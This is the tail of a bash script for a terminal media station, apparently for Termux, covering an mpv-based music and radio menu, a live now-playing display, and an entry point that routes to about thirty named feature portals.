                            printf "  ${C30}Paste stream URL: ${RESET}"; read -r _curl
                            [[ -z "$_curl" ]] && continue
                            printf "  ${C30}Label (optional): ${RESET}"; read -r _clabel
                            echo ""
                            printf "  ${C30}▶ Playing: %s${RESET}\n\n" "${_clabel:-Custom Stream}"
                            mpv --no-video "$_curl" 2>/dev/null \
                                || printf "  ${RED}Stream failed — check URL format${RESET}\n"
                            printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        S|s)
                            pkill mpv 2>/dev/null \
                                && printf "  ${GRN}✓ Radio stopped${RESET}\n" \
                                || printf "  ${FADE}Nothing playing${RESET}\n"
                            printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        B|b) break ;;
                        *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
                    esac
                done ;;
            B|b) _finish_msg musicplayer; return ;;
            RF|rf)
                rm -f "${TMPDIR:-/tmp}/fezzy_mp_cache_$UID.txt" 2>/dev/null
                printf "  ${C30}[*] Cache cleared — rescanning...${RESET}\n"
                _mp_scan
                printf "  ${GRN}✓ Done — %d tracks found${RESET}\n" "${#_MP_FILES[@]}"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            16)
                clear; echo ""
                _dv30
                printf "  ${C30}${BOLD}◉  LIVE TRACK DISPLAY  ·  Ctrl+C to exit${RESET}\n"
                _dv30
                printf "  ${FADE}Updates every second · start music first with [1]-[8]${RESET}\n\n"
                local _live_running=1
                trap '_live_running=0' INT
                while [[ $_live_running -eq 1 ]]; do
                    local _pid; _pid=$(pgrep -x mpv 2>/dev/null | head -1)
                    if [[ -n "$_pid" ]]; then
                        local _fname; _fname=$(tr '\0' '\n' < /proc/"$_pid"/cmdline 2>/dev/null \
                            | grep -v '^-' | grep -v '^mpv' \
                            | grep -iE '\.(mp3|flac|ogg|wav|m4a|opus|aac)$' \
                            | head -1)
                        if [[ -n "$_fname" ]]; then
                            printf "\r  ${C30}${BOLD}▶ %-65s${RESET}" "$(basename "$_fname")"
                        else
                            local _pls; _pls=$(tr '\0' '\n' < /proc/"$_pid"/cmdline 2>/dev/null | grep -E '\.(m3u|m3u8)' | head -1)
                            if [[ -n "$_pls" ]]; then
                                printf "\r  ${C30}▶ Playlist: %-55s${RESET}" "$(basename "$_pls")"
                            else
                                printf "\r  ${GRN}● mpv running%-55s${RESET}" ""
                            fi
                        fi
                    else
                        printf "\r  ${FADE}○ Nothing playing — launch music first%-35s${RESET}" ""
                    fi
                    sleep 1
                done
                trap - INT
                printf "\n\n"; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            17) _mp_ipc_player ;;
            18) _mp_ipc_remote ;;
            *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
        esac
    done 2>/dev/null
}

# ── main entry point ──────────────────────────────────────────────
# FEZZY_DIRECT — set by widget shortcuts to skip boot + go straight to portal
if [[ -n "$FEZZY_DIRECT" ]]; then
    _FEZZY_BOOTED=1
    case "$FEZZY_DIRECT" in
        1|gallery)      gallery_portal ;;
        2|music)        music_portal ;;
        3|video)        video_portal ;;
        4|webgrab)      webgrab_portal ;;
        5|search)       search_portal ;;
        6|tools)        tool_portal ;;
        7|juice)        juicewrld_portal ;;
        8|social)       social_portal ;;
        9|fileorg)      fileorg_portal ;;
        10|books)       books_portal ;;
        11|hacker)      hacker_portal ;;
        12|pdf)         pdf_portal ;;
        13|docs)        documents_portal ;;
        14|android)     android_bridge_portal ;;
        15|downloads)   dlmanager_portal ;;
        16|clipboard)   clipboard_portal ;;
        17|notifs)      notifications_portal ;;
        18|research)    research_portal ;;
        19|github)      github_portal ;;
        20|news)        news_portal ;;
        21|fhacker)     fezzyhacker_portal ;;
        22|encrypt)     encryption_portal ;;
        23|torrent)     torrent_portal ;;
        24|desktop)     termux_desktop_portal ;;
        25|filemgr)     filemanager_portal ;;
        26|shortcuts)   shortcut_builder_portal ;;
        27|foss)        foss_portal ;;
        28|encyclopedia) termux_encyclopedia_portal ;;
        29|artist)      fezzy_artist_portal ;;
        30|player)      music_player_portal ;;
        *)              media_station_portal ;;
    esac
else
    media_station_portal
fi
